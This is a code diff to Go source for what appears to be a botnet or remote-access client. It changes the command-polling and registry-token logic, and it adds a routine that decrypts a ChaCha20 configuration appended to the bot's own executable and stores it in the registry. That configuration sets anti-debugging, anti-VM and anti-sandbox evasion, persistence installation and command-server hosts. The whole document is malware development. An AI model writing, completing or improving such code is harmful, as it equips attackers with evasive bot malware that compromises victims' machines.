@@ -2,6 +2,7 @@ package components
 
 import (
 	"encoding/json"
+	"io"
 	"log"
 	"os"
 	"strconv"
@@ -105,7 +106,7 @@ func send_poll_request(host string) BotState {
 		"X-Sign": base64_enc(sign),
 	}, botcore.use_ssl)
 	if reply == nil || !check_package_legality(reply) {
-		return StateCommandPoll
+		return StateRecoverPoll
 	}
 	reply.Cmd = strings.TrimSpace(reply.Cmd)
 
@@ -132,7 +133,7 @@ func auth_bot_poll(state BotState, host string) BotState {
 
 	switch state {
 	case StateReadGuid:
-		val := reg_read_key(registry.CURRENT_USER, g_regpath, "guid", false)
+		val := reg_read_key(registry.CURRENT_USER, g_regpath, "guid", 1)
 		if val == nil || val == "" {
 			next_state = StateGenGuid
 		} else {
@@ -153,7 +154,7 @@ func auth_bot_poll(state BotState, host string) BotState {
 		}
 		next_state = StateGenGuid
 	case StateReadToken:
-		val := reg_read_key(registry.CURRENT_USER, g_regpath, "token", false)
+		val := reg_read_key(registry.CURRENT_USER, g_regpath, "token", 1)
 		if val == nil || val.(string) == "" {
 			next_state = StateRecoverPoll
 		} else {
@@ -187,7 +188,93 @@ func handle_command() {
 
 }
 
+func read_config() bool {
+	var build_config BuildConfig
+
+	// Try to read config from registry
+	bytesConfig, ok := reg_read_key(registry.CURRENT_USER, g_regpath, "config", 2).([]byte)
+	if ok && bytesConfig != nil {
+		// Read configure from registry ok\
+		len := len(bytesConfig) - 32
+		encConfig := bytesConfig[:len]
+		key := bytesConfig[len:]
+		cleanConfig := dec_chacha20(key, encConfig)
+		if nil == cleanConfig {
+			return false
+		}
+		json.Unmarshal(cleanConfig, &build_config)
+	} else {
+		exe := get_module_file()
+		if exe == "" {
+			return false
+		}
+		f, err := os.Open(exe)
+		if err != nil {
+			return false
+		}
+		defer f.Close()
+		// Read configure size
+		_, err = f.Seek(-4, io.SeekEnd)
+		if err != nil {
+			return false
+		}
+		size_buf := make([]byte, 4)
+		_, err = f.Read(size_buf)
+		if err != nil {
+			return false
+		}
+		// Read configure
+		config_size := bytes_to_int(size_buf)
+		if config_size == 0 {
+			return false
+		}
+		_, err = f.Seek(int64(-(4 + config_size)), io.SeekEnd)
+		if err != nil {
+			return false
+		}
+		config_buf := make([]byte, config_size)
+		f.Read(config_buf)
+		// Read chacha20 key
+		_, err = f.Seek(int64(-(4 + config_size + 32)), io.SeekEnd)
+		key := make([]byte, 32)
+		_, err = f.Read(key)
+		if err != nil {
+			return false
+		}
+		// Decrypt config with chacha20 key
+		decConfigBuf := dec_chacha20(key, config_buf)
+		if decConfigBuf == nil {
+			return false
+		}
+		json.Unmarshal(decConfigBuf, &build_config)
+
+		// Save configure to registry
+		savedConfig := append(config_buf, key...)
+		if !reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "config", savedConfig, true) {
+			log.Println("Failed to create config registry")
+		}
+	}
+	botcore.singleton = build_config.Single
+	botcore.anti_debug = build_config.Anti_debug
+	botcore.anti_vm = build_config.Anti_vm
+	botcore.anti_sandbox = build_config.Anti_sandbox
+	botcore.install = build_config.Install
+	botcore.install_file = build_config.Install_file
+	botcore.mutex_name = build_config.Mutex_name
+	botcore.delay = build_config.Delay
+	botcore.use_ssl = build_config.Use_ssl
+	botcore.version = build_config.Version
+	botcore.hosts = build_config.Host
+
+	return true
+}
+
 func Run() {
+	// Read configure
+	if !read_config() {
+		os.Exit(0)
+	}
+
 	// Check singleton
 	if is_already_exist(botcore.mutex_name) {
 		os.Exit(0)
